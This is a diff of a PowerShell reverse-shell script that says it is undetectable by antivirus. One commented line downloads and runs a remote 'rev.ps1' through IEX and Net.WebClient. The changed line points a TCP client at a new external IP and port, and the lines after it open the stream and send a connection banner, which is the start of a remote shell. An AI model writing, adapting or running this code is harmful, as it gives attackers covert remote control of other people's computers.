@@ -2,7 +2,7 @@
 #Undetectable on 05/09/2022
 # Example  IEX(New-Object Net.WebClient).downloadString('http://192.168.43.16/rev.ps1')
 
-$KLK = New-Object System.Net.Sockets.TCPClient('4.tcp.eu.ngrok.io','16374');
+$KLK = New-Object System.Net.Sockets.TCPClient('3.125.223.134','14352');
 $PLP = $KLK.GetStream();
 [byte[]]$VVCCA = 0..((2-shl(3*5))-1)|%{0};
 $VVCCA = ([text.encoding]::UTF8).GetBytes("Succesfuly connected .`n`n")
